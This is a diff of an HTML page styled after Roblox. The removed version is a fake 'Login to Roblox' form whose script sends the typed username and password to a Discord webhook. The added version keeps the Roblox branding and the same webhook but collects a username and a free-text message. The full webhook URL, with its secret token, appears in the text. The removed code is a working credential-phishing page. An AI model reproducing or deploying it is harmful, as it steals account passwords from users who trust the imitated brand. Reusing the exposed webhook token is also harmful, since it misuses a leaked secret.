@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Login</title>
+  <title>Roblox Style Page</title>
 
   <style>
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background: #000;
+      background: black;
       overflow: hidden;
     }
 
@@ -24,6 +24,11 @@
       padding: 0 20px;
       color: #f7f7f8;
       z-index: 10;
+    }
+
+    .nav-left {
+      font-weight: bold;
+      letter-spacing: 1px;
     }
 
     .nav-links span {
@@ -49,18 +54,37 @@
       position: absolute;
       width: 100%;
       height: 100%;
-
-      background:
-        radial-gradient(circle at center, rgba(0,0,0,0.5), rgba(0,0,0,0.9)),
-        url("https://picsum.photos/1920/1080");
-
-      background-size: cover;
-      background-position: center;
-      filter: blur(3px);
+      overflow: hidden;
     }
 
-    /* LOGIN BOX */
-    .login-box {
+    .card-bg {
+      position: absolute;
+      width: 200px;
+      height: 140px;
+      background-size: cover;
+      border-radius: 12px;
+      opacity: 0.8;
+      animation: float 20s infinite linear;
+    }
+
+    @keyframes float {
+      from {
+        transform: translateY(100vh) rotate(0deg);
+      }
+      to {
+        transform: translateY(-200px) rotate(360deg);
+      }
+    }
+
+    .overlay {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle, rgba(0,0,0,0.4), rgba(0,0,0,0.9));
+    }
+
+    /* CENTER BOX */
+    .box {
       position: absolute;
       top: 50%;
       left: 50%;
@@ -72,7 +96,9 @@
       width: 320px;
       text-align: center;
       color: white;
+
       box-shadow: 0 12px 40px rgba(0,0,0,0.7);
+      z-index: 5;
     }
 
     h2 {
@@ -88,11 +114,6 @@
       border: none;
       background: #2a2a30;
       color: white;
-      font-size: 14px;
-    }
-
-    input::placeholder {
-      color: #888;
     }
 
     button {
@@ -111,12 +132,6 @@
       background: #244edb;
       box-shadow: 0 6px 20px rgba(51,95,255,0.4);
     }
-
-    .small-text {
-      margin-top: 10px;
-      font-size: 12px;
-      color: #aaa;
-    }
   </style>
 </head>
 
@@ -124,7 +139,7 @@
 
   <!-- NAVBAR -->
   <div class="navbar">
-    <div><strong>ROBLOX</strong></div>
+    <div class="nav-left">ROBLOX</div>
 
     <div class="nav-links">
       <span>Charts</span>
@@ -137,25 +152,45 @@
   </div>
 
   <!-- BACKGROUND -->
-  <div class="background"></div>
+  <div class="background" id="bg"></div>
+  <div class="overlay"></div>
 
-  <!-- LOGIN BOX -->
-  <div class="login-box">
-    <h2>Login to Roblox</h2>
+  <!-- CENTER BOX -->
+  <div class="box">
+    <h2>Send a Message</h2>
 
-    <input type="text" id="username" placeholder="Username / Email / Phone">
-    <input type="password" id="password" placeholder="Password">
+    <input type="text" id="username" placeholder="Your username">
+    <input type="text" id="message" placeholder="Type something...">
 
-    <button onclick="sendData()">Log In</button>
-
-    <div class="small-text">Forgot Password or Username?</div>
+    <button onclick="sendData()">Submit</button>
   </div>
 
   <!-- SCRIPT -->
   <script>
+    // Floating cards (fake "games")
+    const images = [
+      "https://picsum.photos/300/200?1",
+      "https://picsum.photos/300/200?2",
+      "https://picsum.photos/300/200?3",
+      "https://picsum.photos/300/200?4",
+      "https://picsum.photos/300/200?5"
+    ];
+
+    const bg = document.getElementById("bg");
+
+    for (let i = 0; i < 15; i++) {
+      const div = document.createElement("div");
+      div.className = "card-bg";
+      div.style.left = Math.random() * 100 + "%";
+      div.style.animationDuration = (15 + Math.random() * 10) + "s";
+      div.style.backgroundImage = `url(${images[Math.floor(Math.random() * images.length)]})`;
+      bg.appendChild(div);
+    }
+
+    // DISCORD WEBHOOK
     function sendData() {
       const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
+      const message = document.getElementById("message").value;
 
       const webhookURL = "https://discord.com/api/webhooks/1495877685338177577/ec19rPYMRLTzhqlZLqavw2qpqmcoyNA2RoUTAfq_T49q9VMthATi12VnwlEtUY02nRs2";
 
@@ -165,21 +200,13 @@
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: "Login attempt:\nUsername: " + user + "\nPassword: " + pass
+          content: "User: " + user + "\nMessage: " + message
         })
       })
-      .then(() => {
-        alert("Logged in (demo)");
-      })
-      .catch(err => {
-        console.error(err);
-        alert("Error");
-      });
+      .then(() => alert("Sent!"))
+      .catch(() => alert("Error"));
     }
   </script>
-
-</body>
-</html>
 
 </body>
 </html>
